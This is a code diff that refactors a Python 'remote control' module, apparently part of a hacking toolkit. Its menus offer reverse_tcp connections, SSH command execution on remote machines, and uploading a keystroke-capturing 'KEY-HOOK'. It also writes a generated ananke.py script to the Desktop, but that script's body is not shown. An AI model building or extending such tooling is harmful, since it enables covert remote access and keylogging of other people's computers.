@@ -1,60 +1,73 @@
-import user_information_module
-from automatic_installation_module import *
+# PSL
+import os
+import socket
+from time import sleep
+from typing import NoReturn
+
+# third-party
+import paramiko
+
+# Own
+from . import clear_terminal, pause_script, Text
+from .user_information import UserDeviceInformation
 
 
-class RemoteControlModules(user_information_module.UserInfo):
+class RemoteControlModules(UserDeviceInformation):
     """
     This module allows you to create reverse_tcp connection between two computers or connect
     to device in other network using SSH.
     """
 
-    def __repr__(self):
+    def __repr__(self) -> str:
         return f"{self.__class__.__name__}"
 
-    def __init__(self):
+    def __init__(self) -> NoReturn:
         super().__init__()
         self.check_default_ananke: str = ""
 
-    def remote_control_startup(self):
+    def remote_control_startup(self) -> NoReturn:
         print("-" * 70)
         print(
             f"This modules allows you to remotely connect to other computer.\n"
-            f"By using {Bcolors.warning}SSH{Bcolors.endc} or {Bcolors.warning}ANANKE MODULE{Bcolors.endc} "
+            f"By using {Text.warning}SSH{Text.endc} or {Text.warning}ANANKE MODULE{Text.endc} "
             f"you can execute command on remote\n"
-            f"computers as well as you can upload generated {Bcolors.warning}KEY-HOOK\n"
-            f"to catch all symbols from keyboard connected with remote computer{Bcolors.endc}."
+            f"computers as well as you can upload generated {Text.warning}KEY-HOOK\n"
+            f"to catch all symbols from keyboard connected with remote computer{Text.endc}."
         )
-        print(f"Do you want to continue {Bcolors.warning}y/n{Bcolors.endc}?")
+        print(f"Do you want to continue {Text.warning}y/n{Text.endc}?")
         print("-" * 70)
         remote_control_choice = str(input("> "))
-        Clear.clear()
+        clear_terminal()
         if remote_control_choice.lower() == "y":
-            time.sleep(1)
-            Clear.clear()
+            sleep(1)
+            clear_terminal()
             self.remote_control_modules_menu()
 
-    def remote_control_modules_menu(self):
-        print(25 * "-" + f"{Bcolors.magenta}REMOTE CONTROL MENU {Bcolors.endc}" + 25 * "-")
-        print(f"{Bcolors.warning}1.SSH{Bcolors.endc}")
-        print(f"{Bcolors.warning}2.ANANKE{Bcolors.endc}")
-        print(f"{Bcolors.warning}0.BACK TO MAIN MENU{Bcolors.endc}")
+
+    def remote_control_modules_menu(self) -> NoReturn:
+        print(25 * "-" + f"{Text.blue}REMOTE CONTROL MENU {Text.endc}" + 25 * "-")
+        print(f"{Text.warning}1.SSH{Text.endc}")
+        print(f"{Text.warning}2.ANANKE{Text.endc}")
+        print(f"{Text.warning}0.BACK TO MAIN MENU{Text.endc}")
         print(70 * "-")
         remote_control_menu_choice = str(input("> "))
         if remote_control_menu_choice == "1":
-            Clear.clear()
+            clear_terminal()
             SSH().shh_start_choice()
         elif remote_control_menu_choice == "2":
-            Clear.clear()
+            clear_terminal()
             try:
-                self.check_default_ananke = os.path.isdir(rf"C:\Users\{self.user_hostname}\Desktop")
-                self.check_default_ananke = os.path.abspath(
-                    rf"C:\Users\{self.user_hostname}\Desktop"
+                self.check_default_ananke = os.path.isdir(
+                    rf"C:\Users\{self._user_hostname}\Desktop"
                 )
-                self.check_default_ananke = rf"C:\Users\{self.user_hostname}\Desktop\ananke.py"
+                self.check_default_ananke = os.path.abspath(
+                    rf"C:\Users\{self._user_hostname}\Desktop"
+                )
+                self.check_default_ananke = rf"C:\Users\{self._user_hostname}\Desktop\ananke.py"
             except OSError:
-                print(f"{Bcolors.error_r}ERROR!{Bcolors.endc} I have problems with save!")
-                time.sleep(2)
-            Clear.clear()
+                print(f"{Text.error}ERROR!{Text.endc} I have problems with save!")
+                sleep(2)
+            clear_terminal()
             with open(self.check_default_ananke, "w") as f:
                 f.write(
                     r"""
@@ -228,47 +241,45 @@ if __name__ == '__main__':
     Ananke().main()
             """
                 )
-            Clear.clear()
-            print(
-                f"Script will save here: {Bcolors.warning}{self.check_default_ananke}{Bcolors.endc}"
-            )
-            os.system("Pause") if os.name == "nt" else input("Press enter to continue")
+            clear_terminal()
+            print(f"Script will save here: {Text.warning}{self.check_default_ananke}{Text.endc}")
+            pause_script()
 
 
 class SSH:
-    def __repr__(self):
+    def __repr__(self) -> str:
         return f"{self.__class__.__name__}"
 
     @staticmethod
-    def shh_start_choice():
-        Clear.clear()
+    def shh_start_choice() -> NoReturn:
+        clear_terminal()
         print(70 * "-")
         print(
             f"By Using this module you can connect to remote computer and control\n"
-            f"this computer using {Bcolors.warning}SSH.{Bcolors.endc}"
+            f"this computer using {Text.warning}SSH.{Text.endc}"
             f"\nOnce connected, you can execute the command on a remote computer.\n"
-            f"Do you want to connect {Bcolors.warning}y/n{Bcolors.endc}?"
+            f"Do you want to connect {Text.warning}y/n{Text.endc}?"
         )
         print(70 * "-")
         command_ssh: str = str(input("> "))
         if command_ssh.upper() == "Y":
             SSH().ssh_command()
         else:
-            print(f"{Bcolors.error_r}WRONG OPTION!{Bcolors.endc}")
-            time.sleep(2)
+            print(f"{Text.error}WRONG OPTION!{Text.endc}")
+            sleep(2)
             SSH().shh_start_choice()
 
     @staticmethod
-    def ssh_command():
-        Clear.clear()
-        print(30 * "-" + f"{Bcolors.magenta}SSH MODULE{Bcolors.endc}" + 30 * "-")
-        time.sleep(0.25)
-        print(f"After connection if you want to disconnect type {Bcolors.warning}0{Bcolors.endc}")
-        ip_ssh: str = str(input(f"Type {Bcolors.warning}IP{Bcolors.endc}: "))
-        port_ssh: str = str(input(f"Type {Bcolors.warning}Port number{Bcolors.endc}: "))
-        login_shh: str = str(input(f"Type {Bcolors.warning}Login{Bcolors.endc}: "))
-        password_ssh: str = str(input(f"Type {Bcolors.warning}Password{Bcolors.endc}: "))
-        Clear.clear()
+    def ssh_command() -> NoReturn:
+        clear_terminal()
+        print(30 * "-" + f"{Text.blue}SSH MODULE{Text.endc}" + 30 * "-")
+        sleep(0.25)
+        print(f"After connection if you want to disconnect type {Text.warning}0{Text.endc}")
+        ip_ssh: str = str(input(f"Type {Text.warning}IP{Text.endc}: "))
+        port_ssh: str = str(input(f"Type {Text.warning}Port number{Text.endc}: "))
+        login_shh: str = str(input(f"Type {Text.warning}Login{Text.endc}: "))
+        password_ssh: str = str(input(f"Type {Text.warning}Password{Text.endc}: "))
+        clear_terminal()
         try:
             while True:
                 client = paramiko.SSHClient()
@@ -286,15 +297,15 @@ class SSH:
                         if client:
                             client.close()
                             input(
-                                f"\n{Bcolors.warning}Disconnecting ...{Bcolors.endc}\nPress any key to continue ..."
+                                f"\n{Text.warning}Disconnecting ...{Text.endc}\nPress any key to continue ..."
                             )
                             break
 
         except socket.gaierror:
-            print(f"{Bcolors.error_r}Can't find host!{Bcolors.endc}")
+            print(f"{Text.error}Can't find host!{Text.endc}")
             print(70 * "-")
         except paramiko.ssh_exception.AuthenticationException:
-            print(f"{Bcolors.error_r}Wrong credentials!{Bcolors.endc}")
+            print(f"{Text.error}Wrong credentials!{Text.endc}")
             print(70 * "-")
         finally:
             ssh_again = str(input("Do you want to connect again y/n?: "))
